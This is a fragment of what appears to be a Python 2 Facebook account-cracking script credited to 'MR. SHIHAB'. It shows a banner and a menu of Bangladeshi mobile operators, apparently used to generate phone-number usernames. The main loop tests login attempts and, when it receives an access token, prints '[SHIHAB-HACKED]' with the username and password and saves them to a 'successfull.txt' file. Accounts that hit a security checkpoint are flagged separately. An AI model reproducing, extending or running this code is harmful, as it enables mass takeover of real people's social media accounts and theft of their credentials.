...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : MR. SHIHAB'
    print '\033[0;94mFB PAGE : @Mr.SHIHAB.VAU'
    print '\033[0;96mGITHUB   : Mr-Shihab-Vau'
    print ''
    print '\033[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
    print '\033[0;91m'
    print 50* '-'
    print("╭──────────────────────────────────────────────────────────────╮")
	print("│ [1]  GP 								    (\x1b[1;96mFREE\x1b[1;97m)                                │")
	print("│ [2] ROBI 									 (\x1b[1;96mFREE\x1b[1;97m)                             │")
	print("│ [3] AIRTEL							 (\x1b[1;91mEROR\x1b[1;97m)                                 │")
	print("│ [4] BANGLALINK 					  			(\x1b[1;96mFREE\x1b[1;97m)                         │")
	print("│ [5] TELETALK 									  (\x1b[1;96mFREE\x1b[1;97m)                        │")
	print("│ [E] EXIT                                                     │")
	print("╰──────────────────────────────────────────────────────────────╯")
    print '\033[0;91m'
    print 50 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SHIHAB-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[SHIHAB-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
